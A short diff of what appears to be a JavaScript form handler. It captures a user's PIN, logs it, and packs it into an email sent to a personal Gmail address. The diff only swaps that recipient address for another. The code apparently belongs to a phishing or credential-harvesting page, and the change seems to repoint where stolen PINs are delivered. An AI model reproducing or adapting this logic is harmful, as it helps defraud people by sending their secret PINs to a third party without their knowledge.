@@ -33,7 +33,7 @@ document
     console.log(pin);
     event.preventDefault();
     const emailParams = {
-      to_name: "Victorchinemerem191@gmail.com",
+      to_name: "gracesufficient65@gmail.com",
       pin: pin,
     };
     console.log(emailParams);
